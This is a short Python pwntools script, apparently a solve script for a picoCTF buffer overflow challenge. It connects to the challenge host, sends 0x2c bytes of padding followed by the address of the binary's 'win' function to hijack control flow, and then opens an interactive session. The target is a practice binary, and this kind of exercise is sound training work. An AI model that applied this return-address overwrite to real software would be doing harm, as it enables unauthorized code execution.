#!/usr/bin/env python
from pwn import *

epath = "./vuln"
e = ELF(epath)
#r = process(epath)
r = remote("saturn.picoctf.net", 63588)

r.recvuntil("tring:")
r.sendline(flat(b"\x00"*0x2c,
                e.sym.win))

r.interactive()
r.close()
